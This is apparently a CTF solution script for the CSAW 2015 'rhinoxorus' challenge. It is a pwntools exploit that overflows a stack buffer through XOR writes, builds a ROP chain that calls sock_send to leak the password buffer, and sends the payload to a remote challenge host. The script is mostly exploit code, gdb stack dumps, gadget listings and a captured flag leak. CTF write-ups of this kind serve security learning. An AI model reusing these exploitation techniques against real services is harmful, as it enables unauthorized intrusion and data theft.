#!/usr/bin/env python
from pwn import *

'''
avi@debian:~/Documents/csaw_quals_2015_09/pwn$ ../checksec.sh/checksec --file rhinoxorus_cd2be6030fb52cbc13a48b13603b9979 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0               8       rhinoxorus_cd2be6030fb52cbc13a48b13603b9979
'''

'''
void process_connection(int sockfd)
{
    ssize_t bytes_read;
    unsigned char recv_buf[BUF_SIZE];
    memset(recv_buf, 0, sizeof(recv_buf));
    bytes_read = recv(sockfd, recv_buf, (unsigned int )BUF_SIZE, 0);
    if (bytes_read > 0)
    {
        func_array[recv_buf[0]](recv_buf, (unsigned int)bytes_read);
    }
    return;
}
'''

'''
ps -ef | grep pwn/rhino | grep -v grep | awk '{print $2}' | xargs kill
'''

host = 'localhost' if '--live' not in sys.argv else '54.152.37.20'

#p = remote(host, 24242)

#p.send(' '+'\x00'*50+'A'*100)
'''
(gdb) set follow-fork-mode child
(gdb) b *0x08056af8
(gdb) r
Breakpoint 1, 0x08056af8 in process_connection ()
(gdb) x/100wx $esp
0xffffcb90:     0xffffcbac      0x00000097      0x00000100      0x00000000
0xffffcba0:     0xffffcc08      0xf7ffda94      0x00000097      0x00000020
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x41000000
0xffffcbe0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcbf0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc00:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
(gdb) adv *0x0804a7bc
in function func_52, count is 151, bufsize is 0x04
0x0804a7bc in func_52 ()
(gdb) x/256wx $esp
0xffffcb60:     0xf7fbd2e8      0xf7fb9000      0x00000000      0xffffcbac
0xffffcb70:     0x04ffccb8      0xf7ff04b0      0x04040404      0xcecc1700
0xffffcb80:     0xf7fb9000      0xffffcb90      0xffffccb8      0x08056afa
0xffffcb90:     0xffffcbac      0x00000097      0x00000100      0x00000000
0xffffcba0:     0xffffcc08      0xf7ffda94      0x00000097      0x00000020
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x41000000
0xffffcbe0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcbf0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc00:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
0xffffcd20:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd30:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd40:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd50:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd60:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd70:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd80:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd90:     0xffffffff      0x10000000      0x00000000      0xcecc1700
0xffffcda0:     0x00000000      0xf7ffd938      0xffffcdd8      0x0805788f
0xffffcdb0:     0x00005eb2      0x0000000a      0x08060008      0x080578eb
0xffffcdc0:     0x00000001      0xffffce84      0x08060008      0x0805f0d9
0xffffcdd0:     0xf7fb93c4      0xffffcdf0      0x00000000      0xf7e2ca63
0xffffcde0:     0x080578a0      0x00000000      0x00000000      0xf7e2ca63
0xffffcdf0:     0x00000001      0xffffce84      0xffffce8c      0xf7feac7a
0xffffce00:     0x00000001      0xffffce84      0xffffce24      0x0805f03c
0xffffce10:     0x0804836c      0xf7fb9000      0x00000000      0x00000000
0xffffce20:     0x00000000      0x42152048      0x781a8458      0x00000000
0xffffce30:     0x00000000      0x00000000      0x00000001      0x08048750
0xffffce40:     0x00000000      0xf7ff04b0      0xf7e2c979      0xf7ffd000
0xffffce50:     0x00000001      0x08048750      0x00000000      0x08048771
0xffffce60:     0x08056ddb      0x00000001      0xffffce84      0x080578a0
0xffffce70:     0x08057900      0xf7feb130      0xffffce7c      0x0000001c
0xffffce80:     0x00000001      0xffffd009      0x00000000      0xffffd060
0xffffce90:     0xffffd06b      0xffffd07c      0xffffd08e      0xffffd0bd
0xffffcea0:     0xffffd0ee      0xffffd102      0xffffd10e      0xffffd11e
0xffffceb0:     0xffffd134      0xffffd146      0xffffd15c      0xffffd165
0xffffcec0:     0xffffd6fe      0xffffd738      0xffffd74c      0xffffd780
0xffffced0:     0xffffdc8b      0xffffdcb9      0xffffdd09      0xffffdd15
0xffffcee0:     0xffffdd2e      0xffffdd6c      0xffffdd8d      0xffffdd9b
0xffffcef0:     0xffffddaa      0xffffddd9      0xffffddea      0xffffddf3
0xffffcf00:     0xffffde0f      0xffffde28      0xffffde41      0xffffde49
0xffffcf10:     0xffffde58      0xffffde67      0xffffde73      0xffffde7c
0xffffcf20:     0xffffdec4      0xffffdf26      0xffffdf33      0xffffdf52
0xffffcf30:     0xffffdf67      0xffffdf80      0x00000000      0x00000020
0xffffcf40:     0xf7fd9d50      0x00000021      0xf7fd9000      0x00000010
0xffffcf50:     0x078bfbff      0x00000006      0x00001000      0x00000011
(gdb) adv *0x0804a821
0x0804a821 in func_52 ()
(gdb) x/256wx $esp
0xffffcb50:     0xffffcb79      0x00000096      0x00000004      0x000001b5
0xffffcb60:     0xf7fbd2e8      0xf7fb9000      0x00000000      0xffffcbac
0xffffcb70:     0x04ffccb8      0x00000096      0x04040424      0xcecc1700
0xffffcb80:     0xf7fb9000      0xffffcb90      0xffffccb8      0x08056afa
0xffffcb90:     0xffffcbac      0x00000096      0x00000100      0x00000000
0xffffcba0:     0xffffcc08      0xf7ffda94      0x41000097      0x41414161
0xffffcbb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcbc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcbd0:     0x41414141      0x41414141      0x41414141      0x00414141
0xffffcbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc00:     0x00000000      0x00000000      0x00000000      0x41410000
0xffffcc10:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc20:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcc40:     0x00414141      0x00000000      0x00000000      0x00000000
0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcca0:     0x00000000      0x00000000      0x00000000      0xcecc1700
0xffffccb0:     0xffffcda8      0xf7ff04b0      0xffffcda8      0x08056d83
0xffffccc0:     0x00000004      0x00000000      0xffffcda8      0x08056d66
0xffffccd0:     0xf7ffd938      0x00000000      0x08060008      0xf7e85eb2
0xffffcce0:     0x00000010      0x00000003      0x00000004      0x00000000
0xffffccf0:     0xb25e0002      0x00000000      0x00000000      0x00000000
0xffffcd00:     0x59e20002      0x0100007f      0x00000000      0x00000000
0xffffcd10:     0x08056b11      0x7fffffff      0xfffffffe      0xffffffff
0xffffcd20:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd30:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd40:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd50:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd60:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd70:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd80:     0xffffffff      0xffffffff      0xffffffff      0xffffffff
0xffffcd90:     0xffffffff      0x10000000      0x00000000      0xcecc1700
0xffffcda0:     0x00000000      0xf7ffd938      0xffffcdd8      0x0805788f
0xffffcdb0:     0x00005eb2      0x0000000a      0x08060008      0x080578eb
0xffffcdc0:     0x00000001      0xffffce84      0x08060008      0x0805f0d9
0xffffcdd0:     0xf7fb93c4      0xffffcdf0      0x00000000      0xf7e2ca63
0xffffcde0:     0x080578a0      0x00000000      0x00000000      0xf7e2ca63
0xffffcdf0:     0x00000001      0xffffce84      0xffffce8c      0xf7feac7a
0xffffce00:     0x00000001      0xffffce84      0xffffce24      0x0805f03c
0xffffce10:     0x0804836c      0xf7fb9000      0x00000000      0x00000000
0xffffce20:     0x00000000      0x42152048      0x781a8458      0x00000000
0xffffce30:     0x00000000      0x00000000      0x00000001      0x08048750
0xffffce40:     0x00000000      0xf7ff04b0      0xf7e2c979      0xf7ffd000
0xffffce50:     0x00000001      0x08048750      0x00000000      0x08048771
0xffffce60:     0x08056ddb      0x00000001      0xffffce84      0x080578a0
0xffffce70:     0x08057900      0xf7feb130      0xffffce7c      0x0000001c
0xffffce80:     0x00000001      0xffffd009      0x00000000      0xffffd060
0xffffce90:     0xffffd06b      0xffffd07c      0xffffd08e      0xffffd0bd
0xffffcea0:     0xffffd0ee      0xffffd102      0xffffd10e      0xffffd11e
0xffffceb0:     0xffffd134      0xffffd146      0xffffd15c      0xffffd165
0xffffcec0:     0xffffd6fe      0xffffd738      0xffffd74c      0xffffd780
0xffffced0:     0xffffdc8b      0xffffdcb9      0xffffdd09      0xffffdd15
0xffffcee0:     0xffffdd2e      0xffffdd6c      0xffffdd8d      0xffffdd9b
0xffffcef0:     0xffffddaa      0xffffddd9      0xffffddea      0xffffddf3
0xffffcf00:     0xffffde0f      0xffffde28      0xffffde41      0xffffde49
0xffffcf10:     0xffffde58      0xffffde67      0xffffde73      0xffffde7c
0xffffcf20:     0xffffdec4      0xffffdf26      0xffffdf33      0xffffdf52
0xffffcf30:     0xffffdf67      0xffffdf80      0x00000000      0x00000020
0xffffcf40:     0xf7fd9d50      0x00000021      0xf7fd9000      0x00000010
(gdb) info r eax
eax            0x804aa90        134523536
'''
#p.send(' '+chr(30^4)+'BB'+(0xffffcc90-0xffffcbb0)*'B')
#p.send(chr(30)+chr(0)*128)
#p.send(' '*4+p32(255)*(252/4))

payload = ['\x00']*256
#payload = ['\x00']*0xd3
#payload[0] = chr(32) # "opcode" for a function with 0x4 stacksize
#payload[0] = chr(33) # "opcode" for a function with 0x0 stacksize
#payload[0] = chr(19) # "opcode" for a function with 0xd0 stacksize
#payload[0] = chr(212) # "opcode" for a function with 0xd4 stacksize
#payload[0] = chr(66) # "opcode" for a function with 0x8c stacksize
#payload[0] = chr(45) # "opcode" for a function with 0x38 stacksize, whose successor has 0xd8 stacksize
payload[0] = chr(41) # "opcode" for a function with 0x28 stacksize, whose successor has 0x88 stacksize
f1_size = 0x28
f2_size = 0x88

#offset = 0x38 + 4 * 6
#offset = 0xd8 + 4 * 6
#offset = 0x28 + 4*6
#payload[offset:offset+4] = p32(255)
offset = 0x88 + 4*6
payload[offset:offset+4] = "\xff\xff" # not fully understood, but this pokes count from the 2nd step (func_33, func_5b's successor)

'''
for i in range(4,256,4):
    payload[i:i+4] = p32(254)
'''
'''
for i in [0xa4,0xa8]:
    payload[i:i+4] = p32(254)
'''
#payload [0xa8:] = p32(254)*50

# b *0x08056b10
def write(i, x):
    global payload
    global f1_size
    payload[f1_size+i*4:f1_size+i*4+4] = p32(x)

p4_ret = 0x080578f8
p0_ret = 0x080578fc

send_sock = 0x0804884b
password = 0x805f0c0

write(4, 0x8056afa ^ p4_ret)
#write(9, 0xffffcc08 ^ 0x41414141) 
#write(9, 0xffffcc08 ^ 0x41414141 ^ 0xbebe8d49 ^ p4_ret) # deep voodoo magic, no idea why this works (EDIT: the expression xors to 0)
write(9, p4_ret)
write(14, send_sock)
write(15, 0x41414141)
write(16, 0x00000004)
write(17, password)
write(18, 0x45454545)

'''
0x41414141 in ?? ()
(gdb) x/64wx $esp
0xffffcb90:     0xffffcbac      0x000000fd      0x00000100      0x00000000
0xffffcba0:     0xffffcc08      0xf7ffda94      0x000000fe      0x00000029
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbe0:     0x00000000      0x49442bbb      0x00000000      0x00000000
0xffffcbf0:     0x00000000      0x0000ffff      0x00000000      0x00000000
0xffffcc00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc40:     0x00000000      0x00000000      0x00000000      0x0000ffff
0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
'''

'''
[0x080578f8]> pd 5
           0x080578f8    5b             pop ebx
           0x080578f9    5e             pop esi
           0x080578fa    5f             pop edi
           0x080578fb    5d             pop ebp
           0x080578fc    c3             ret
'''
print payload, len(payload)

p = remote(host, 24242)
p.send(''.join(payload))
p.interactive()

sys.exit(1)
# obtain the location of count
'''
for i in range(4,256,4):
    newpayload = list(payload)
    newpayload[i:i+4] = p32(255) # try to use xor to set count to 0, to skip extra functions
    p = remote(host, 24242)
    p.send(''.join(newpayload))
'''

'''
>>> import re
>>> x = open('pwn500_rhino_bruteforce_count.txt').read()
>>> y = re.findall('.*count is 0', x, re.DOTALL)
>>> z = re.findall('Accepted', y[0])
>>> len(z)
7
'''

leave_ret = 0x080487b8
count = 60
payload[8*4:(8+1)*4] = p32(255^count) # set count with xor

'''
(gdb) set follow-fork-mode child
(gdb) b func_56
(gdb) r
Starting program: /home/avi/Documents/csaw_quals_2015_09/pwn/rhinoxorus_cd2be6030fb52cbc13a48b13603b9979
[Rhinoxorus] Entering main listening loop...
[Rhinoxorus] Accepted connection from 127.0.0.1
[New process 16467]
in function func_52, count is 256, bufsize is 0x04
[Switching to process 16467]

Breakpoint 1, 0x0804aa96 in func_56 ()
(gdb) x/32wx $ebp
0xffffcb48:     0xffffcb88      0x0804a823      0xffffcb79      0x00000001
0xffffcb58:     0x00000004      0x000001b5      0xf7fbd2e8      0xf7fb9000
0xffffcb68:     0x00000000      0xffffcbac      0x04ffccb8      0x0000001d
0xffffcb78:     0x04040424      0x70c2b900      0xf7fb9000      0xffffcb90
0xffffcb88:     0xffffccb8      0x08056afa      0xffffcbac      0x00000001
0xffffcb98:     0x00000100      0x00000000      0xffffcc08      0xf7ffda94
0xffffcba8:     0x00000100      0x00000020      0x00000000      0x00000000
0xffffcbb8:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) x/i 0x0804a823
   0x804a823 <func_52+171>:     add    $0x10,%esp
(gdb) x/i 0x08056afa
   0x8056afa <process_connection+121>:  add    $0x10,%esp
(gdb) p &password
$1 = (<data variable, no debug info> *) 0x805f0c0 <password>
(gdb) x/s 0x805f0c0
0x805f0c0 <password>:   "flag{NOT_ACTUALLY_A_FLAG}"
'''

'''
(gdb) set follow-fork-mode child 
(gdb) r
Starting program: /home/avi/Documents/csaw_quals_2015_09/pwn/rhinoxorus_cd2be6030fb52cbc13a48b13603b9979 
[Rhinoxorus] Entering main listening loop...
[Rhinoxorus] Accepted connection from 127.0.0.1
[New process 17212]
in function func_52, count is 256, bufsize is 0x04
in function func_56, count is 4, bufsize is 0x14
in function func_42, count is 3, bufsize is 0xc4
in function func_06, count is 2, bufsize is 0xd4
in function func_32, count is 1, bufsize is 0x84

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 17212]
0x41414141 in ?? ()
(gdb) x/64wx $esp
0xffffcb90:     0xffffcbac      0x00000004      0x00000100      0x00000000
0xffffcba0:     0xffffcc08      0xf7ffda94      0x00000100      0x00000020
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x49442bbb      0x00000000      0x000000fb      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc80:     0x00000000      0x00000000      0x00000000      0x00000000
'''
#0x08057914: les ecx, [eax]; pop ebx; ret;
#0x08057911: add byte [eax], al; add esp, 8; pop ebx; ret;
#0x080487b5: add esp, 0x10; leave; ret;
'''
[0x080487b5]> pd 3
           0x080487b5    83c410         add esp, 0x10
           0x080487b8    c9             leave
           0x080487b9    f3c3           ret
'''
#0x080561e1: sub esp, dword [edi + edi*8]; dec ecx; ret;
#0x080578f8: pop ebx; pop esi; pop edi; pop ebp; ret;
'''
[0x080578f8]> pd 5
           0x080578f8    5b             pop ebx
           0x080578f9    5e             pop esi
           0x080578fa    5f             pop edi
           0x080578fb    5d             pop ebp
           0x080578fc    c3             ret
'''

'''
# 0804884b <sock_send>:
# int sock_send(int sockfd, char *buf, size_t length)
send_sock = 0x0804884b
ebp_ret = 0x080578fb
tcp_server_loop = 0x08056b3c
payload[6*4:(6+1)*4] = p32(0x8056afa ^ 0x41414141) # set EIP
payload[7*4:(7+1)*4] = p32(0xffffcbac ^ 0x41414141) # set next EIP
# 8th word has to be count, and is already set above, count is aliased to sockfd
password = 0x805f0c0
#payload[9*4:(9+1)*4] = p32(0x00000100 ^ password) # set buf
#payload[10*4:(10+1)*4] = p32(32) # set len
'''

'''
#payload[-4:] = "C"*4
print payload, len(payload)

p = remote(host, 24242)
p.send(''.join(payload))
'''

#p.interactive()
'''
[+] Opening connection to 54.152.37.20 on port 24242: Done
[*] Switching to interactive mode
cc21fe41b44ba70d0e6978c840698601\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa1\x88\x0\x9a\x89\x0\x93\x8a\x0\x8c\x8b\x0\x85\x8c\x0~\x8d\x0w\x8e\x0p\x8f\x0i\x90\x0b\x91\x0[\x92\x0T\x93\x0M\x94\x0F\x95\x0?\x96\x08\x97\x01\x98\x0*\x99\x0#\x9a\x0\x1c\x9b\x0\x15\x9c\x0\x0e\x9d\x0\x07\x9e\x0\x00\x9f\x0�\xa0\x0ݣ\x0֤\x0ϥ\x0Ȧ\x0x\xa7\x0>\xa8\x0\x04\xa9\x0ʩ\x0\x90\xaa\x0V\xab\x0\x1c\xac\x0\xa8\xad\x0n\xae\x04\xaf\x0�\xb0\x0\x86\xb1\x0L\xb2\x0\x12\xb3\x0س\x0\x9e\xb4\x0d\xb5\x0*\xb6\x0\xb6\xb7\x0\x7f\xb8\x0H\xb9\x0\x11\xba\x0ں\x0\xa9\xbb\x0x\xbc\x0M\xbd\x04\xbe\x0*\xbf\x0 \x19\x12\x0b\x04���\x0�����\x0��\x0��\x0��\x0\xbe\xb7\xb0\xa9\xa2\x9b\x94\x8d\x86\x7fxqjc\UNG@�\xb6|��\x0\x94Z �\xacr8\xfe��\x0\x8aP\x16��\x0\xa2h.���R!�������\x0\x8a��\x0|un\xfe\x0g\xff\x0`\x00\x0Y\x0R\x0K\x03\x0D\x04\x0=\x05\x06\x06\x0/\x07\x0\x0!    \x0\x1a
\x0�\x0�\x0�\x0�\x0\xbf\x16\x0\xb8\x17\x0h\x18\x0.\x19\x0\xba\x1a\x0\x80\x1b\x0F\x1c\x0\x0c\x1d\x0�\x0\x98\x1e\x0^\x1f\x0$ \x0�\xb0!\x0v"\x0<#\x0$\x0�$\x0\x8e%\x0T&\x0\x1a'\x0�\xa6(\x0o)\x08*\x0+\x0�+\x0\x99,\x0h-\x0=.\x0$/\x0\x1a0\x0\x101\x0    2\x03\x0��4\x0���7\x0�8\x0�9\x0�:\x0�;\x0\xbc<\x0\xb5=\x0\xae>\x0\xa7?\x0\xa0@\x0\x99A\x0\x92B\x0\x8bC\x0\x84D\x0}E\x0vF\x0oG\x0hH\x0aI\x0ZJ\x0SK\x0LL\x0EM\x0>N\x07O\x00P\x0�\xa6Q\x0lR\x02S\x0��T\x0\x84U\x0JV\x0\x10W\x0�W\x0\x9cX\x0bY\x0(Z\x0�\xb4[\x0z\\x0@]\x0\x06^\x0�^\x0\x92_\x0X`\x0\x1ea\x0�\xb0b\x0yc\x0Bd\x0\x11e\x0�\xb5f\x0\x9cg\x0\x92h\x0\x88i\x0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x